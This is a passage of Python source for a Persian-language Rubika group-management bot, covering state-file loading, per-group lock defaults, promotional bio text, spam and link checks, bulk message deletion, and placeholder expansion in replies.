    file_speak_is = os.path.isfile(file_speak) if os else False
    if file_speak_is:
        os.remove(file_speak)
    file_speakx = 'Speakx.json'
    file_speakx_is = os.path.isfile(file_speakx) if os else False
    if file_speakx_is:
        try:
            with open(file_speakx, 'r') as openfile:
                SPEAKX = json.load(openfile)
        except Exception:
            makeit = False
            try:
                with open('backup_SPEAKX.json', 'r') as openfile:
                    SPEAKX = json.load(openfile)
            except Exception:
                makeit = True
            if makeit:
                SPEAKX = {}
                with open(file_speakx, 'w') as outfile:
                    json.dump(SPEAKX, outfile)
    else:
        with open(file_speakx, 'w') as outfile:
            json.dump(SPEAKX, outfile)
    typespeak = handle_text_file()
    if isinstance(OWNER, str) and OWNER.startswith('u0') and check_last_owner(OWNER):
        client.send_text(OWNER, 'فعال شدم.')

    USERS = {}
    INLINES = {}
    file_users = 'Users.json'
    file_inlines = 'File_inlines.json'
    file_users_is = os.path.isfile(file_users)
    if file_users_is:
        try:
            with open(file_users, 'r') as openfile:
                USERS = json.load(openfile)
        except Exception:
            makeit = False
            try:
                with open('backup_USERS.json', 'r') as openfile:
                    USERS = json.load(openfile)
            except Exception:
                makeit = True
            if makeit:
                USERS = {}
                with open(file_users, 'w') as outfile:
                    json.dump(USERS, outfile)
    else:
        with open(file_users, 'w') as outfile:
            json.dump(USERS, outfile)
    file_inlines_is = os.path.isfile(file_inlines)
    if file_inlines_is:
        try:
            with open(file_inlines, 'r') as openfile:
                INLINES = json.load(openfile)
        except Exception:
            makeit = False
            try:
                with open('backup_INLINES.json', 'r') as openfile:
                    INLINES = json.load(openfile)
            except Exception:
                makeit = True
            if makeit:
                INLINES = {}
                with open(file_inlines, 'w') as outfile:
                    json.dump(INLINES, outfile)
    else:
        with open(file_inlines, 'w') as outfile:
            json.dump(INLINES, outfile)
    for group in INFOS:
        make_ok = INFOS[group]['types']['ok']
        make_ok = make_ok.strip()[0:4]
        INFOS[group]['types']['ok'] = make_ok
        if group not in USERS:
            USERS[group] = {}
        'if LSMessage[object_guid][0] == LSMessage[object_guid][1]:\n                ~~~~~~~~~~~~~~~~~~~~~~^^^\n        IndexError: list index out of range'
        LSMessage[group] = [0, 1]
        ARMessages[group] = []
        STMessages[group] = []
        Spam[group] = []
        JoindUsers[group] = []
        CheckJoins[group] = {}
        if 'timeout' not in INFOS[group]:
            INFOS[group]['timeout'] = False
        if 'channels' not in INFOS[group]:
            INFOS[group]['channels'] = {}
        if 'remmember' not in INFOS[group]:
            INFOS[group]['remmember'] = []
        if 'voice_call' not in INFOS[group]:
            INFOS[group]['voice_call'] = 0
        if 'type_messages' not in INFOS[group]:
            INFOS[group]['type_messages'] = {}
        if 'AUTOS' not in INFOS[group]:
            INFOS[group]['AUTOS'] = []
        if 'locks_warning' not in INFOS[group]:
            INFOS[group]['locks_warning'] = '33333333333333333333333333333333333'
        if 'locks_warning_show' not in INFOS[group]:
            INFOS[group]['locks_warning_show'] = '11111111111111111111111111111111111'
        if 'locks_ban' not in INFOS[group]:
            INFOS[group]['locks_ban'] = '11111111111111111111111111111111111'
        if 'types' not in INFOS[group]:
            INFOS[group]['types'] = {'type': 'natual', 'font': 'natual', 'ok': default_ok}
        if 'silent_list' not in INFOS[group]:
            INFOS[group]['silent_list'] = {}
        if 'exempt_list' not in INFOS[group]:
            INFOS[group]['exempt_list'] = {}
        if 'black_list' not in INFOS[group]:
            INFOS[group]['black_list'] = {}
        if 'filterlist' not in INFOS[group]:
            INFOS[group]['filterlist'] = []
        if 'main_keys' not in INFOS[group]:
            INFOS[group]['main_keys'] = ['ربات']
        while len(INFOS[group]['locks_warning']) < 35:
            INFOS[group]['locks_warning'] += '1'
        while len(INFOS[group]['locks_warning_show']) < 35:
            INFOS[group]['locks_warning_show'] += '1'
        while len(INFOS[group]['locks_ban']) < 35:
            INFOS[group]['locks_ban'] += '1'
        while len(INFOS[group]['locks']) < 35:
            INFOS[group]['locks'] += '1'
        while len(INFOS[group]['keys']) < 90:
            INFOS[group]['keys'] += '1'
        while len(INFOS[group]['setting']) < 35:
            INFOS[group]['setting'] += '1'
        setting = list(INFOS[group]['setting'])
        key = int(15)
        setting[key] = '0'
        INFOS[group]['setting'] = ''.join(setting)
        UPFILES(file_infos, INFOS)
        UPTXTFILES(file_owner, OWNER)
    # ziro.ir
    # ===========================================
    result = {"manager_pro": {
        "protect": "⫷ ویکتوربات با موفقیت در گروه شما فعال شد ✅\n\nاز این لحظه به بعد، مدیریت گروه شما ساده‌تر، سریع‌تر و حرفه‌ای‌تر خواهد بود.\nویکتوربات با بهره‌گیری از ابزارهای هوشمند، امکانات متنوعی را در اختیار شما قرار می‌دهد تا بتوانید گروه خود را به بهترین شکل اداره کنید.\n\n📖 برای آشنایی با امکانات و مشاهده فهرست کامل دستورات، کافیست عبارت «راهنما» یا «دستورات» را در گروه ارسال نمایید.\n\n✨ برخی از قابلیت‌های ویکتوربات:\n✔️ مدیریت و حذف خودکار لینک‌ها و پیام‌های مزاحم\n✔️ خوش‌آمدگویی خودکار به اعضای جدید\n✔️ قفل انواع محتوا (عکس، ویدئو، استیکر و ...)\n✔️ ابزارهای ضد اسپم و ضد تبلیغات\n✔️ دستورات پیشرفته مدیریتی برای مدیران\n\n🔹 برای خرید ویکتوربات، ارتقای اکانت و دریافت پشتیبانی اختصاصی یا تمدید می‌توانید به کانال‌های رسمی ما مراجعه فرمایید:\n🌐 @ROBOT1SALES\n🌐 @Robot1sales2\n\nبا ویکتوربات، امنیت و آرامش گروه خود را تضمین کنید و مدیریتی مدرن را تجربه نمایید.",
        "HI": "HI I AM ROBOT [Manager] FROM RUBIKA - ACROBOT",
        "bio": "⫷ ربات مدیریت گروه ۲۴ ساعته ⫸\n\n@ROBOT1SALES | کانال ما ⚝\n\n@XX_GEAM_XX  پشتیبانی خرید ربات ✆",
        "old_bios": [
          "⫷ ربات مدیریت گروه ۲۴ ساعته ⫸\n\n@ROBOT1SALES | کانال ما ⚝\n\n@XX_GEAM_XX  پشتیبانی خرید ربات ✆"
      ],
      "notic_owner": "سازنده با موفقیت تعیین شد ✅\n\nاکنون می‌توانید ربات را به گروه دلخواه خود اضافه کنید. تنها کافیست پس از افزودن ربات، کلمه‌ی «فعال» را در گروه ارسال نمایید تا فرآیند راه‌اندازی به‌طور کامل انجام شود. ⚡️\n\n📖 برای دسترسی به فهرست کامل دستورات و امکانات ربات، می‌توانید در هر زمان عبارت «راهنما» یا «دستورات» را در گروه ارسال کنید.\n\n📌 در صورت نیاز به راهنمایی بیشتر یا دریافت پشتیبانی، کانال‌های رسمی ما در خدمت شما هستند:\n✨ @ROBOT1SALES\n✨ @Robot1sales2\n\n🚀 با فعال‌سازی ویکتوربات، مدیریت گروه خود را به سطحی هوشمند و پیشرفته ارتقا دهید و تجربه‌ای متفاوت از نظم و امنیت داشته باشید."
    }}
    
    Informations = {
        "protect": "⫷ ویکتوربات با موفقیت در گروه شما فعال شد ✅\n\nاز این لحظه به بعد، مدیریت گروه شما ساده‌تر، سریع‌تر و حرفه‌ای‌تر خواهد بود.\nویکتوربات با بهره‌گیری از ابزارهای هوشمند، امکانات متنوعی را در اختیار شما قرار می‌دهد تا بتوانید گروه خود را به بهترین شکل اداره کنید.\n\n📖 برای آشنایی با امکانات و مشاهده فهرست کامل دستورات، کافیست عبارت «راهنما» یا «دستورات» را در گروه ارسال نمایید.\n\n✨ برخی از قابلیت‌های ویکتوربات:\n✔️ مدیریت و حذف خودکار لینک‌ها و پیام‌های مزاحم\n✔️ خوش‌آمدگویی خودکار به اعضای جدید\n✔️ قفل انواع محتوا (عکس، ویدئو، استیکر و ...)\n✔️ ابزارهای ضد اسپم و ضد تبلیغات\n✔️ دستورات پیشرفته مدیریتی برای مدیران\n\n🔹 برای خرید ویکتوربات، ارتقای اکانت و دریافت پشتیبانی اختصاصی یا تمدید می‌توانید به کانال‌های رسمی ما مراجعه فرمایید:\n🌐 @ROBOT1SALES\n🌐 @Robot1sales2\n\nبا ویکتوربات، امنیت و آرامش گروه خود را تضمین کنید و مدیریتی مدرن را تجربه نمایید.",
        "HI": "HI I AM ROBOT [Manager] FROM RUBIKA - ACROBOT",
        "bio": "⫷ ربات مدیریت گروه ۲۴ ساعته ⫸\n\n@ROBOT1SALES | کانال ما ⚝\n\n@XX_GEAM_XX  پشتیبانی خرید ربات ✆",
        "old_bios": [
          "⫷ ربات مدیریت گروه ۲۴ ساعته ⫸\n\n@ROBOT1SALES | کانال ما ⚝\n\n@XX_GEAM_XX  پشتیبانی خرید ربات ✆"
      ],
      "notic_owner": "سازنده با موفقیت تعیین شد ✅\n\nاکنون می‌توانید ربات را به گروه دلخواه خود اضافه کنید. تنها کافیست پس از افزودن ربات، کلمه‌ی «فعال» را در گروه ارسال نمایید تا فرآیند راه‌اندازی به‌طور کامل انجام شود. ⚡️\n\n📖 برای دسترسی به فهرست کامل دستورات و امکانات ربات، می‌توانید در هر زمان عبارت «راهنما» یا «دستورات» را در گروه ارسال کنید.\n\n📌 در صورت نیاز به راهنمایی بیشتر یا دریافت پشتیبانی، کانال‌های رسمی ما در خدمت شما هستند:\n✨ @ROBOT1SALES\n✨ @Robot1sales2\n\n🚀 با فعال‌سازی ویکتوربات، مدیریت گروه خود را به سطحی هوشمند و پیشرفته ارتقا دهید و تجربه‌ای متفاوت از نظم و امنیت داشته باشید."
    }
    # Typebots = result['Typebots']
    Informations['old_bios'] = Informations['old_bios']
    # ===========================================
    # بخش بالا مربوط به تگ بیو می باشد

    user = client.get_chat_info(GUIDME)['user']
    first_name = user.get('first_name', None)
    last_name = user.get('last_name', None)
    username = user.get('username', None)
    bio, ischange = makeTagBio(user, True, True, True)
    if ischange:
        try:
            client.update_profile(first_name, last_name, bio, username)
        except Exception as e:
            print("Error in update profile: ", e)
            canSetBio = False
    deleting = []
    for object_guid in USERS:
        for user_guid in USERS[object_guid]:
            if user_guid == GUIDME:
                continue
            user = USERS[object_guid][user_guid]
            mes = int(user[0])
            war = int(user[1])
            state = mes - war
            if state <= 10:
                deleting.append(user_guid)
        for user in deleting:
            USERS[object_guid].pop(user)
        deleting = []
    if old_vr:
        week = Week()
        now = Hour()
        clock = f'» {now} ⌯ {week}'
        more = ''
        int_old_vr = int(old_vr.replace('.', ''))
        more += '\n\n' + MPro('رفع چندین باگ', 4)
        more += MPro('بهینه سازی سورس کد', 4)
        more += MPro('افزایش سرعت ربات', 4)
        NOTIC = f'» ربات Acro آپدیت شد. ⚡\n» ورژن ° {NEWVR}\n{clock}\n\n{more}\n─┅━━━♦️━━━┅─'
        NOTIC = NOTIC.replace('ربات', 'ربات')
        client.send_text(object_guid, NOTIC)

    def ExtraInfo(OBJM, INFOOBJECT, SETTING_KEYS, TimeMessages, method):
        step = PorotectMSS(SETTING_KEYS, TimeMessages, 15)
        if not step:
            return False
        if method == 'bye':
            num = 'خدافظی'
        elif method == 'welcome':
            num = 'خوشامدگویی'
        else:
            num = method
        step1 = int(SETTING_KEYS[0])
        step2 = int(SETTING_KEYS[Listset[num]])
        if step1 and step2:
            mess = make_dinamic_ans(INFOOBJECT[method], OBJM['guid_sender'], OBJM['object_guid'], OBJM['message_id'], OBJM['ismanagerms'], OBJM['is_reply_message'], OBJM['INFOOBJECT']['filterlist'], istimer=OBJM['istimer'])
            return mess
        return False

    def CheckSetting(SETTING_KEYS, method):
        step1 = int(SETTING_KEYS[0])
        step2 = int(SETTING_KEYS[Listset[method]])
        if step1 and step2:
            return True
        else:
            return False

    def CheckTypeGets(message, filterlist, _):
        message_type = message['type']
        reports = {}
        if message_type in ListLockNames:
            pr = ListLockNames[message_type]
            reports[pr] = Listlocks[pr]
        command = False
        if 'text' in message:
            command = message['text'].lower()
        if command:
            if '@' in command:
                reports[7] = 'ایدی'
            if '.ir' in command or 'http' in command:
                reports[8] = 'لینک'
            xc = ''
            for x in command:
                if x in TPE:
                    xc += x
            for x in filterlist:
                if x in xc:
                    reports[15] = 'متن نامناسب 〔 ' + x + ' 〕'
                    break
            for x in command:
                if x in TEG:
                    reports[18] = 'انگلیسی'
                    break
            if len(command.split('\n')) >= 25 or len(command) > 420:
                reports[20] = 'کد هنگی'
        if 'forwarded_from' in message:
            reports[9] = 'فوروارد'
        if 'metadata' in message:
            reports[19] = 'متادیتا'
        return reports

    def get_all_chats() -> list:
        chats = []
        next_start_id_get_chats = True
        while next_start_id_get_chats:
            try:
                if isinstance(next_start_id_get_chats, str):
                    get_chats = client.get_chats(next_start_id_get_chats)
                else:
                    get_chats = client.get_chats()
                chats += get_chats['chats']
                time.sleep(1)
            except:
                time.sleep(1)
                continue
            if get_chats['has_continue']:
                next_start_id_get_chats = get_chats['next_start_id']
            else:
                next_start_id_get_chats = False
        return chats

    def joining(channels, object_guid, guid_sender, ok='', inpv=False):
        if object_guid not in CheckJoins:
            CheckJoins[object_guid] = {}

        if len(channels) > 0:
            if guid_sender not in CheckJoins[object_guid]:
                CheckJoins[object_guid][guid_sender] = {}
                CheckJoins[object_guid][guid_sender]['num'] = 0
                CheckJoins[object_guid][guid_sender]['chs'] = []
            links = []
            for channel in channels:
                if channel in CheckJoins[object_guid][guid_sender]['chs']:
                    continue
                time.sleep(0.1)
                user = client.get_chat_info(guid_sender)['user']
                if client.check_join(channels[channel], guid_sender):
                    CheckJoins[object_guid][guid_sender]['chs'].append(channel)
                else:
                    links.append(channel)
            if len(links) > 0:
                if CheckJoins[object_guid][guid_sender]['num'] == len(links):
                    return False
                CheckJoins[object_guid][guid_sender]['num'] = len(links)
                if inpv:
                    mess = MPro('برای ادمین شدن لطفا عضو کانال/گروه های زیر شوید و سپس کد را ارسال کنید ' + str(ok)) + '\n'
                else:
                    mess = MPro('برای استفاده از ربات در کانال/گروه های زیر عضو شوید. ' + str(ok)) + '\n'
                for link in links:
                    mess += MPro(link)
                return mess
        return None

    def Maqam(maqam):
        if maqam == 'سازنده':
            return '4'
        elif maqam == 'مالک':
            return '3'
        elif maqam == 'ویژه':
            return '2'
        elif maqam == 'ادمین':
            return '1'
        return '0'

    def Get_tip_from_str(text):
        command, TIP = ('', '0')
        for line in text.split('\n'):
            cmd = 'مقام'
            if line.strip().startswith(cmd):
                len_cmd = len(cmd)
                if line[len_cmd:].strip().startswith('-'):
                    line = line[len_cmd:].strip()
                    tip_str = line.strip()
                    if tip_str.startswith('u0'):
                        TIP = tip_str
                    else:
                        TIP = Maqam(tip_str)
            command += line.strip() + '\n'
        return {'command': command.strip(), 'TIP': TIP}

    def Get_actions_from_str(text):
        actions = []
        command = ''
        for line in text.split('\n'):
            cmd = 'دستور'
            if line.strip().startswith(cmd):
                len_cmd = len(cmd)
                if line[len_cmd:].strip().startswith('-'):
                    line = line[len_cmd:].strip()
                    action = line.strip()
                    actions.append(action)
            command += line.strip() + '\n'
        return {'command': command.strip(), 'actions': actions}

    def delete_messages_pro(OBJM, type_def, cmd):
        cmd = str(cmd)
        target_guids = []
        target_ids = []
        number = False
        cmds = cmd.split(' ')
        for step in cmds:
            if step.startswith('@'):
                target_ids.append(step)
            elif step.startswith('u0'):
                target_guids.append(step)
            else:
                try:
                    number = int(step)
                except:
                    pass
        for target_id in target_ids:
            result = Get_guid(target_id)
            if result[0]:
                if result[1] == 'user':
                    target_guids.append(result[0])
        if not number:
            return 0
        if len(target_ids) > 0 and len(target_guids) <= 0:
            return 0
        all_deleted = 0
        info = client.get_chat_info(OBJM['object_guid'])
        if 'DeleteGlobalAllMessages' in info['chat']['access'] and 'SendMessages' in info['chat']['access']:
            send_message(OBJM, MPro('درحال حذف ... ' + OBJM['INFOOBJECT']['types']['ok'], 2), OBJM['message_id'])
            last_post_id = info['chat']['last_message']['message_id']
            next_post_id, endofloop, message_sended_id, cm, limit = (False, True, False, 0, 0)
            to_messages = 0
            while endofloop and limit < 5 and (to_messages < number):
                if OBJM['object_guid'] not in INFOS or INFOS[OBJM['object_guid']]['state']:
                    time.sleep(0.1)
                    if next_post_id:
                        if next_post_id >= last_post_id:
                            limit += 1
                            time.sleep(1)
                            next_post_id = str(int(last_post_id) - 1)
                        else:
                            last_post_id = next_post_id
                    try:
                        posts = client.get_messages_interval(OBJM['object_guid'], last_post_id)['messages']
                        next_post_id = posts[0]['message_id']
                    except:
                        limit += 1
                        time.sleep(1)
                        continue
                    posts.reverse()
                    gets = []
                    x = 0
                    for post in posts:
                        if not endofloop:
                            break
                        post_id = post['message_id']
                        if last_post_id < post_id:
                            continue
                        if x + all_deleted >= number:
                            break
                        gets.append(post)
                        x += 1
                    to_messages += len(gets)
                    if len(gets) > 0:
                        badmes = []
                        if type_def == 'delete_messages':
                            if len(target_guids) > 0:
                                for mes in gets:
                                    if 'author_object_guid' in mes:
                                        for target_guid in target_guids:
                                            if target_guid == mes['author_object_guid']:
                                                badmes.append(mes['message_id'])
                            else:
                                for mes in gets:
                                    badmes.append(mes['message_id'])
                        elif type_def == 'check_messages':
                            if len(target_guids) > 0:
                                for mes in gets:
                                    if 'author_object_guid' in mes:
                                        for target_guid in target_guids:
                                            if target_guid == mes['author_object_guid']:
                                                Check = CheckTypeGets(mes, OBJM['INFOOBJECT']['filterlist'], OBJM['object_guid'])
                                                for step in Check:
                                                    if int(OBJM['LOCKS_KEYS'][step]) == 0:
                                                        badmes.append(mes['message_id'])
                            else:
                                for mes in gets:
                                    if 'author_object_guid' in mes and mes['author_object_guid'] not in (Coder, OBJM['INFOOBJECT']['owner'], OWNER):
                                        if mes['author_object_guid'] not in OBJM['INFOOBJECT']['full_admins']:
                                            Check = CheckTypeGets(mes, OBJM['INFOOBJECT']['filterlist'], OBJM['object_guid'])
                                            for step in Check:
                                                if isinstance(step, str):
                                                    step = Listlocks[step]
                                                if int(OBJM['LOCKS_KEYS'][step]) == 0:
                                                    badmes.append(mes['message_id'])
                        elif type_def == 'delete_edited_messages':
                            if len(target_guids) > 0:
                                for mes in gets:
                                    if 'author_object_guid' in mes:
                                        for target_guid in target_guids:
                                            if target_guid == mes['author_object_guid']:
                                                if mes['is_edited']:
                                                    badmes.append(mes['message_id'])
                            else:
                                for mes in gets:
                                    if mes['is_edited']:
                                        badmes.append(mes['message_id'])
                        elif type_def == 'check_edited_messages':
                            if len(target_guids) > 0:
                                for mes in gets:
                                    if mes['is_edited']:
                                        if 'author_object_guid' in mes:
                                            for target_guid in target_guids:
                                                if target_guid == mes['author_object_guid']:
                                                    Check = CheckTypeGets(mes, OBJM['INFOOBJECT']['filterlist'], OBJM['object_guid'])
                                                    for step in Check:
                                                        if int(OBJM['LOCKS_KEYS'][step]) == 0:
                                                            badmes.append(mes['message_id'])
                            else:
                                for mes in gets:
                                    if mes['is_edited']:
                                        if 'author_object_guid' in mes and mes['author_object_guid'] not in (Coder, OBJM['INFOOBJECT']['owner'], OWNER):
                                            if mes['author_object_guid'] not in OBJM['INFOOBJECT']['full_admins']:
                                                Check = CheckTypeGets(mes, OBJM['INFOOBJECT']['filterlist'], OBJM['object_guid'])
                                                for step in Check:
                                                    if int(OBJM['LOCKS_KEYS'][step]) == 0:
                                                        badmes.append(mes['message_id'])
                        elif type_def == 'delete_event_messages':
                            for mes in gets:
                                if 'event_data' in mes:
                                    badmes.append(mes['message_id'])
                        else:
                            for mes in gets:
                                badmes.append(mes['message_id'])
                        if len(badmes) > 0:
                            try:
                                client.delete_messages(OBJM['object_guid'], badmes)
                                limit = 0
                            except:
                                limit += 1
                                time.sleep(1)
                                continue
                            all_deleted += len(badmes)
                else:
                    break
        else:
            send_message(OBJM, MPro('دسترسی حذف پیام ندارم. ' + OBJM['INFOOBJECT']['types']['ok'], 2), OBJM['message_id'])
            all_deleted = False
        return all_deleted

    def meta_data_text(text):
        if '&' in text:
            tags = {'1': '``', '۱': '``', '2': '**', '۲': '**', '3': '__', '۳': '__', '4': '~~', '۴': '~~', '5': '--', '۵': '--', '6': '@@', '۶': '@@', '7': '##', '۷': '##'}
            for tag in tags:
                text = text.replace('&' + tag, tags[tag])
                text = text.replace(tag + '&', tags[tag])
        return text

    def text_contain_tags(text, object_guid, guid_sender, is_reply_message):
        owner = INFOS[object_guid]['owner']
        text = meta_data_text(text)
        text = remove_ids_and_links(text=text)
        if object_guid not in USERS:
            USERS[object_guid] = {}
        if '#u0' in text:
            for line in text.split('\n'):
                for step in line.split(' '):
                    if step.startswith('#u0'):
                        step = step[1:]
                        while f'##{step}' in text:
                            text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                        if step not in USERS[object_guid]:
                            getInfoUser(object_guid, step)
                        new_step = USERS[object_guid][step][2]
                        text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'اسم_کاربر'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if guid_sender not in USERS[object_guid]:
                getInfoUser(object_guid, guid_sender)
            new_step = USERS[object_guid][guid_sender][2]
            text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'گوید_کاربر'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{str(guid_sender)}').strip()
        step = 'گوید_سازنده'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{str(OWNER)}').strip()
        step = 'گوید_مالک'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{str(owner)}').strip()
        step = 'گوید_ربات'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{str(GUIDME)}').strip()
        step = 'گوید_ریپلای'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if is_reply_message:
                message_info = GetInfoByMessageId(object_guid, is_reply_message)
                if message_info:
                    user_guid = GetReplyGuid(message_info)
                    if user_guid and user_guid not in USERS[object_guid]:
                        getInfoUser(object_guid, user_guid)
                    text = text.replace(f'#{step}', f'{str(user_guid)}').strip()
            else:
                text = text.replace(f'#{step}', f'{str(guid_sender)}').strip()
        step = 'تاریخ'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            new_step = Date()
            text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'اسم_ربات'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if GUIDME not in USERS[object_guid]:
                getInfoUser(object_guid, GUIDME)
            new_step = USERS[object_guid][GUIDME][2]
            text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'اسم_ریپلای'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if is_reply_message:
                message_info = GetInfoByMessageId(object_guid, is_reply_message)
                if message_info:
                    user_guid = GetReplyGuid(message_info)
                    if user_guid and user_guid not in USERS[object_guid]:
                        getInfoUser(object_guid, user_guid)
                    new_step = USERS[object_guid][user_guid][2]
                    text = text.replace(f'#{step}', f'{new_step}').strip()
            else:
                if guid_sender not in USERS[object_guid]:
                    getInfoUser(object_guid, guid_sender)
                new_step = USERS[object_guid][guid_sender][2]
                text = text.replace(f'#{step}', f'{new_step}').strip()
        for step in ['گوید_گروه', 'گوید_گپ']:
            if f'#{step}' in text:
                while f'##{step}' in text:
                    text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                text = text.replace(f'#{step}', f'{str(object_guid)}').strip()
        for step in ['اسم_گروه', 'اسم_گپ']:
            if f'#{step}' in text:
                while f'##{step}' in text:
                    text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                new_step = INFOS[object_guid]['name']
                text = text.replace(f'#{step}', f'{new_step}').strip()
        for step in ['لینک_گروه', 'لینک_گپ']:
            if f'#{step}' in text:
                while f'##{step}' in text:
                    text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                try:
                    join_link = client.get_link(object_guid)['join_link']
                    text = text.replace(f'#{step}', f'{join_link}').strip()
                except:
                    text = text.replace(f'#{step}', 'قادر به گرفتن لینک نیستم').strip()
        for step in ['درصد_تصادفی', 'درصد']:
            if f'#{step}' in text:
                while f'##{step}' in text:
                    text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                while f'#{step}' in text:
                    text = text.replace(f'#{step}', f'{str(random.randint(0, 100))}', 1).strip()
        for step in ['عدد_تصادفی', 'عدد']:
            if f'#{step}' in text:
                while f'##{step}' in text:
                    text = text.replace(f'##{step}', f'#{step}#{step}').strip()
                while f'#{step}' in text:
                    text = text.replace(f'#{step}', f'{str(random.randint(0, 9))}', 1).strip()
        step = 'اسم_سازنده'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if OWNER not in USERS[object_guid]:
                getInfoUser(object_guid, OWNER)
            new_step = USERS[object_guid][OWNER][2]
            text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'اسم_مالک'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if owner not in USERS[object_guid]:
                getInfoUser(object_guid, owner)
            new_step = USERS[object_guid][owner][2]
            text = text.replace(f'#{step}', f'{new_step}').strip()
        step = 'زمان'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Hour()}').strip()
        step = 'ساعت'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Hour()}').strip()
        step = 'سال'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Year()}').strip()
        step = 'هفته'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Week()}').strip()
        step = 'ماه'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Month()}').strip()
        step = 'روز'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{Day()}').strip()
        step = 'اسم_تصادفی'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            list_guids = []
            for user_guid in USERS[object_guid]:
                if user_guid == GUIDME:
                    continue
                user = USERS[object_guid][user_guid]
                mes, war = (int(user[0]), int(user[1]))
                state = mes - war
                'if state <= 5:\n                    continue'
                list_guids.append(user_guid)
            if len(list_guids) > 0 and f'#{step}' in text:
                user_guid = random.choice(list_guids)
                if len(list_guids) >= 2:
                    list_guids.remove(user_guid)
                if user_guid not in USERS[object_guid]:
                    getInfoUser(object_guid, user_guid)
                new_step = USERS[object_guid][user_guid][2]
                text = text.replace(f'#{step}', f'{new_step}', 1).strip()
        step = 'گوید_تصادفی'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            list_guids = []
            for user_guid in USERS[object_guid]:
                try:
                    if user_guid == GUIDME:
                        continue
                    user = USERS[object_guid][user_guid]
                    mes, war = (int(user[0]), int(user[1]))
                    state = mes + war
                    if state <= 5:
                        continue
                    list_guids.append(user_guid)
                except:
                    pass
            while len(list_guids) > 0 and f'#{step}' in text:
                user_guid = random.choice(list_guids)
                if len(list_guids) >= 2:
                    list_guids.remove(user_guid)
                if user_guid not in USERS[object_guid]:
                    getInfoUser(object_guid, user_guid)
                new_step = user_guid
                text = text.replace(f'#{step}', f'{new_step}', 1).strip()
        step = 'گوید'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            text = text.replace(f'#{step}', f'{str(guid_sender)}').strip()
        step = 'اسم'
        if f'#{step}' in text:
            while f'##{step}' in text:
                text = text.replace(f'##{step}', f'#{step}#{step}').strip()
            if guid_sender not in USERS[object_guid]:
                getInfoUser(object_guid, guid_sender)
            new_step = USERS[object_guid][guid_sender][2]
            text = text.replace(f'#{step}', f'{new_step}').strip()
        return text

    def get_steps(text):
        list_steps = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            steps = line.split(' ')
            for step in steps:
                list_steps.append(step)
        return list_steps

    def Sorting(lst):
        lst2 = sorted(lst, key=len)
        return lst2

    def make_dinamic_ans(text, guid_sender, object_guid, message_id, ismanagerms, is_reply_message, filterlist, save=False, pv=False, istimer=False):
        if not isinstance(text, str):
            return False
        text = text_contain_tags(text, object_guid, guid_sender, is_reply_message)
        if not isinstance(text, str):
            return False
        if pv:
            object_guid = guid_sender
        if istimer:
            message_id = None
        list_media_tag = ['#image', '#video', '#voice', '#audio', '#gif']
        for tag in list_media_tag:
            if tag in text.lower():
                for line in text.split('\n'):
                    for step in line.split(' '):
                        if step.startswith(tag):
                            list_infos = {'image': 'png', 'gif': 'mp4', 'voice': 'mpeg', 'audio': 'mp3', 'video': 'mp4'}
                            filename = step[1:].strip()
                            tag_name = tag[1:]
                            format = list_infos[tag_name]
                            text = text.replace(step, '').strip()
                            if len(text) <= 0:
                                text = None
                                break
                            for st in filterlist:
                                if st in text:
                                    next_word = Font_close(st)
                                    text = text.replace(st, next_word)
                            for st in LISTFILTERPRO:
                                if st in text:
                                    next_word = Font_filter(st)
                                    text = text.replace(st, next_word)
                            if tag_name == 'gif' and filename in INLINES:
                                ResultME = client.send_message(object_guid, INLINES[filename], text, message_id)
                                if save:
